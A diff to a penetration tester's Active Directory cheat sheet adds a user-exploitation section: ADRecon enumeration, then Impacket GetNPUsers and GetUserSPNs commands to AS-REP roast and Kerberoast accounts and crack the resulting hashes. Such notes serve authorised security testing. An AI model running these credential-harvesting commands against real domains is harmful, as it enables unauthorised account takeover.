@@ -13,11 +13,22 @@ nmap --max-rtt-timeout 100ms --initial-rtt-timeout 100ms --max-retries 0 -sn -iL
   Feed AD-Recon's Computers.csv into [fruityad.py](https://github.com/smit1759/cheetsheets/blob/master/fruityad.py) - it'll show you what you can pwn easily.
 7) Profit
 
-## Exploitation
+## Exploitation - Machines
 1) Stop, think, am I going to break shit?
 2) RECORD EVERY STEP
 3) Verify your exploit will work
 4) Clean up after yourself
+
+## Exploitation - Users
+1) Run [ADRecon.ps1](https://github.com/sense-of-security/ADRecon) (by Sense of Security ;))
+2) Get the output of the Users.xlsx and feed all usernames into a text file
+3) Run Impackets GetNPUsers Script:
+`#> GetNPUsers.py <domain>/ -usersfile TargetUsers.txt -format hashcat -outputfile hashes.asreproast -dc-ip <DC>`
+4) If the user is ASRepRoasted then crack the hash
+5) Get the password and feed it into the GetUserSPN.py:
+`#> GetUserSPNs.py <DOMAIN>/<User>:<Pass> -outputfile hashes.kerberoast -dc-ip <DC>`
+6) Crack hash if you've successfully Kerberoasted a user
+
 
 ## Post-Exploitation
 1) Open RDP (Makes other exploits easier to run) - Use the Remmina client on Kali
